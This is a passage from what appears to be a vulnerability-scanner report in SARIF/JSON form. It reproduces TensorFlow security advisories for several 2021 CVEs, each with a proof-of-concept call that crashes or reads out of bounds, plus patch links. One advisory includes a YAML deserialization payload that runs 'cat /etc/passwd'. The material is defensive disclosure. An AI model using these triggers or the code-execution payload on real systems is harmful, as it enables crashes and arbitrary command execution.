                "markdown": "**Vulnerability CVE-2021-37665**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37665)|\n\n### Impact\nDue to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RequantizationRangePerChannel(\n  input=[],\n  input_min=[0,0,0,0,0],\n  input_max=[1,1,1,1,1],\n  clip_value_max=1)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/mkl/mkl_requantization_range_per_channel_op.cc) does not validate the dimensions of the `input` tensor.\n\nA similar issue occurs in `MklRequantizePerChannelOp`:\n\n```python\nimport tensorflow as tf \nfrom tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  out_type=tf.int)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/mkl/mkl_requantize_per_channel_op.cc) does not perform full validation for all the input arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [9e62869465573cb2d9b5053f1fa02a81fce21d69](https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69) and in the Github commit [203214568f5bc237603dbab6e1fd389f1572f5c9](https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37657",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37657"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37657",
              "help": {
                "text": "Vulnerability CVE-2021-37657\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37657](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37657)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixDiagV*`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixDiagV3(\n  diagonal=[1,0],\n  k=[],\n  num_rows=[1,2,3],\n  num_cols=[4,5],\n  padding_value=[],\n  align=`RIGHT_RIGHT`)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/linalg/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong:\n\n```cc\n  auto\u0026 diag_index = context-\u003einput(1);\n  ...\n  lower_diag_index = diag_index.flat\u003cint32\u003e()(0);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f2a673bd34f0d64b8e40a551ac78989d16daad09](https://github.com/tensorflow/tensorflow/commit/f2a673bd34f0d64b8e40a551ac78989d16daad09).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37657**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37657](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37657)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixDiagV*`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixDiagV3(\n  diagonal=[1,0],\n  k=[],\n  num_rows=[1,2,3],\n  num_cols=[4,5],\n  padding_value=[],\n  align=`RIGHT_RIGHT`)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/linalg/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong:\n\n```cc\n  auto\u0026 diag_index = context-\u003einput(1);\n  ...\n  lower_diag_index = diag_index.flat\u003cint32\u003e()(0);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f2a673bd34f0d64b8e40a551ac78989d16daad09](https://github.com/tensorflow/tensorflow/commit/f2a673bd34f0d64b8e40a551ac78989d16daad09).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37678",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37678"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37678",
              "help": {
                "text": "Vulnerability CVE-2021-37678\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37678)\n### Impact\nTensorFlow and Keras can be tricked to perform arbitrary code execution when deserializing a Keras model from YAML format.\n\n```python\nfrom tensorflow.keras import models\n\npayload = ```\n!!python/object/new:type\nargs: [`z`, !!python/tuple [], {`extend`: !!python/name:exec }]\nlistitems: \"__import__(`os`).system(`cat /etc/passwd`)\"\n```\n  \nmodels.model_from_yaml(payload)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/python/keras/saving/model_config.py#L66-L104) uses `yaml.unsafe_load` which can perform arbitrary code execution on the input.\n\n### Patches\nGiven that YAML format support requires a significant amount of work, we have removed it for now.\n\nWe have patched the issue in GitHub commit [23d6383eb6c14084a8fc3bdf164043b974818012](https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Arjun Shibu.",
                "markdown": "**Vulnerability CVE-2021-37678**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37678)|\n\n### Impact\nTensorFlow and Keras can be tricked to perform arbitrary code execution when deserializing a Keras model from YAML format.\n\n```python\nfrom tensorflow.keras import models\n\npayload = ```\n!!python/object/new:type\nargs: [`z`, !!python/tuple [], {`extend`: !!python/name:exec }]\nlistitems: \"__import__(`os`).system(`cat /etc/passwd`)\"\n```\n  \nmodels.model_from_yaml(payload)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/python/keras/saving/model_config.py#L66-L104) uses `yaml.unsafe_load` which can perform arbitrary code execution on the input.\n\n### Patches\nGiven that YAML format support requires a significant amount of work, we have removed it for now.\n\nWe have patched the issue in GitHub commit [23d6383eb6c14084a8fc3bdf164043b974818012](https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Arjun Shibu."
              },
              "properties": {
                "security-severity": "9.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37690",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37690"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37690",
              "help": {
                "text": "Vulnerability CVE-2021-37690\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37690](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37690)\n### Impact\nWhen running shape functions, some functions (such as `MutableHashTableShape`) produce extra output information in the form of a `ShapeAndType` struct. The shapes embedded in this struct are owned by an inference context that is cleaned up almost immediately; if the upstream code attempts to access this shape information, it can trigger a segfault.\n\n`ShapeRefiner` is mitigating this for normal output shapes by cloning them (and thus putting the newly created shape under ownership of an inference context that will not die), but we were not doing the same for shapes and types. This commit fixes that by doing similar logic on output shapes and types.\n\n### Patches\nWe have patched the issue in GitHub commit [ee119d4a498979525046fba1c3dd3f13a039fbb1](https://github.com/tensorflow/tensorflow/commit/ee119d4a498979525046fba1c3dd3f13a039fbb1).                                                                                                          \n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-37690**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37690](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37690)|\n\n### Impact\nWhen running shape functions, some functions (such as `MutableHashTableShape`) produce extra output information in the form of a `ShapeAndType` struct. The shapes embedded in this struct are owned by an inference context that is cleaned up almost immediately; if the upstream code attempts to access this shape information, it can trigger a segfault.\n\n`ShapeRefiner` is mitigating this for normal output shapes by cloning them (and thus putting the newly created shape under ownership of an inference context that will not die), but we were not doing the same for shapes and types. This commit fixes that by doing similar logic on output shapes and types.\n\n### Patches\nWe have patched the issue in GitHub commit [ee119d4a498979525046fba1c3dd3f13a039fbb1](https://github.com/tensorflow/tensorflow/commit/ee119d4a498979525046fba1c3dd3f13a039fbb1).                                                                                                          \n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37663",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37663"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37663",
              "help": {
                "text": "Vulnerability CVE-2021-37663\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37663)\n### Impact                                                                                                                                                                                                                                                                                \nDue to incomplete validation in `tf.raw_ops.QuantizeV2`, an attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeV2(\n  input=[1,2,3],\n  min_range=[1,2],\n  max_range=[],\n  T=tf.qint32,\n  mode=`SCALED`,\n  round_mode=`HALF_AWAY_FROM_ZERO`,\n  narrow_range=False,\n  axis=1,\n  ensure_minimum_range=3)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/quantize_op.cc#L59) has some validation but does not check that `min_range` and `max_range` both have the same non-zero number of elements. If `axis` is provided (i.e., not `-1`), then validation should check that it is a value in range for the rank of `input` tensor and then the lengths of `min_range` and `max_range` inputs match the `axis` dimension of the `input` tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [6da6620efad397c85493b8f8667b821403516708](https://github.com/tensorflow/tensorflow/commit/6da6620efad397c85493b8f8667b821403516708).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37663**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37663)|\n\n### Impact                                                                                                                                                                                                                                                                                \nDue to incomplete validation in `tf.raw_ops.QuantizeV2`, an attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeV2(\n  input=[1,2,3],\n  min_range=[1,2],\n  max_range=[],\n  T=tf.qint32,\n  mode=`SCALED`,\n  round_mode=`HALF_AWAY_FROM_ZERO`,\n  narrow_range=False,\n  axis=1,\n  ensure_minimum_range=3)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/quantize_op.cc#L59) has some validation but does not check that `min_range` and `max_range` both have the same non-zero number of elements. If `axis` is provided (i.e., not `-1`), then validation should check that it is a value in range for the rank of `input` tensor and then the lengths of `min_range` and `max_range` inputs match the `axis` dimension of the `input` tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [6da6620efad397c85493b8f8667b821403516708](https://github.com/tensorflow/tensorflow/commit/6da6620efad397c85493b8f8667b821403516708).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37664",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37664"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37664",
              "help": {
                "text": "Vulnerability CVE-2021-37664\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37664)\n### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `BoostedTreesSparseCalculateBestFeatureSplit`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(\n  node_id_range=[0,10],\n  stats_summary_indices=[[1, 2, 3, 0x1000000]],\n  stats_summary_values=[1.0],\n  stats_summary_shape=[1,1,1,1],\n  l1=l2=[1.0],\n  tree_complexity=[0.5],\n  min_node_weight=[1.0],\n  logits_dimension=3,\n  split_type=`inequality`)                                                                                                                                                                                                                                                                \n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) needs to validate that each value in `stats_summary_indices` is in range.\n  \n### Patches\nWe have patched the issue in GitHub commit [e84c975313e8e8e38bb2ea118196369c45c51378](https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37664**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37664)|\n\n### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `BoostedTreesSparseCalculateBestFeatureSplit`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(\n  node_id_range=[0,10],\n  stats_summary_indices=[[1, 2, 3, 0x1000000]],\n  stats_summary_values=[1.0],\n  stats_summary_shape=[1,1,1,1],\n  l1=l2=[1.0],\n  tree_complexity=[0.5],\n  min_node_weight=[1.0],\n  logits_dimension=3,\n  split_type=`inequality`)                                                                                                                                                                                                                                                                \n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) needs to validate that each value in `stats_summary_indices` is in range.\n  \n### Patches\nWe have patched the issue in GitHub commit [e84c975313e8e8e38bb2ea118196369c45c51378](https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37667",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37667"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37667",
              "help": {
                "text": "Vulnerability CVE-2021-37667\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37667)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_string_ops\n\ngen_string_ops.unicode_encode(\n  input_values=[],\n  input_splits=[],\n  output_encoding=`UTF-8`,\n  errors=`ignore`,\n  replacement_char=`a`)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/unicode_ops.cc#L533-L539) reads the first dimension of the `input_splits` tensor before validating that this tensor is not empty: \n\n```cc\n  const Tensor\u0026 input_splits = context-\u003einput(1);\n  const auto input_splits_flat = input_splits.flat\u003cSPLITS_TYPE\u003e();\n  TensorShape output_shape({input_splits.dim_size(0) - 1});\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2e0ee46f1a47675152d3d865797a18358881d7a6](https://github.com/tensorflow/tensorflow/commit/2e0ee46f1a47675152d3d865797a18358881d7a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37667**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37667)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_string_ops\n\ngen_string_ops.unicode_encode(\n  input_values=[],\n  input_splits=[],\n  output_encoding=`UTF-8`,\n  errors=`ignore`,\n  replacement_char=`a`)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/unicode_ops.cc#L533-L539) reads the first dimension of the `input_splits` tensor before validating that this tensor is not empty: \n\n```cc\n  const Tensor\u0026 input_splits = context-\u003einput(1);\n  const auto input_splits_flat = input_splits.flat\u003cSPLITS_TYPE\u003e();\n  TensorShape output_shape({input_splits.dim_size(0) - 1});\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2e0ee46f1a47675152d3d865797a18358881d7a6](https://github.com/tensorflow/tensorflow/commit/2e0ee46f1a47675152d3d865797a18358881d7a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37638",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37638"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37638",
              "help": {
                "text": "Vulnerability CVE-2021-37638\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37638)\n### Impact\nSending invalid argument for `row_partition_types` of `tf.raw_ops.RaggedTensorToTensor` API results in a null pointer dereference and undefined behavior:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=1,\n  values=10,\n  default_value=21,\n  row_partition_tensors=tf.constant([0,0,0,0]),\n  row_partition_types=[])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L328) accesses the first element of a user supplied list of values without validating that the provided list is not empty.\n\n### Patches\nWe have patched the issue in GitHub commit [301ae88b331d37a2a16159b65b255f4f9eb39314](https://github.com/tensorflow/tensorflow/commit/301ae88b331d37a2a16159b65b255f4f9eb39314).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37638**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37638)|\n\n### Impact\nSending invalid argument for `row_partition_types` of `tf.raw_ops.RaggedTensorToTensor` API results in a null pointer dereference and undefined behavior:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=1,\n  values=10,\n  default_value=21,\n  row_partition_tensors=tf.constant([0,0,0,0]),\n  row_partition_types=[])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L328) accesses the first element of a user supplied list of values without validating that the provided list is not empty.\n\n### Patches\nWe have patched the issue in GitHub commit [301ae88b331d37a2a16159b65b255f4f9eb39314](https://github.com/tensorflow/tensorflow/commit/301ae88b331d37a2a16159b65b255f4f9eb39314).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37647",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37647"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37647",
              "help": {
                "text": "Vulnerability CVE-2021-37647\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37647](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37647)\n### Impact\nWhen a user does not supply arguments that determine a valid sparse tensor, `tf.raw_ops.SparseTensorSliceDataset` implementation can be made to dereference a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SparseTensorSliceDataset(\n  indices=[[],[],[]],\n  values=[1,2,3],\n  dense_shape=[3,3])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L240-L251) has some argument validation but fails to consider the case when either `indices` or `values` are provided for an empty sparse tensor when the other is not.\n\nIf `indices` is empty (as in the example above), then [code that performs validation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L260-L261) (i.e., checking that the indices are monotonically increasing) results in a null pointer dereference: \n\n```cc\n    for (int64_t i = 0; i \u003c indices-\u003edim_size(0); ++i) {\n      int64_t next_batch_index = indices-\u003ematrix\u003cint64\u003e()(i, 0);\n      ...\n    }\n```\n\nIf `indices` as provided by the user is empty, then `indices` in the C++ code above is backed by an empty `std::vector`, hence calling `indices-\u003edim_size(0)` results in null pointer dereferencing (same as calling `std::vector::at()` on an empty vector).\n\n### Patches\nWe have patched the issue in GitHub commit [02cc160e29d20631de3859c6653184e3f876b9d7](https://github.com/tensorflow/tensorflow/commit/02cc160e29d20631de3859c6653184e3f876b9d7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
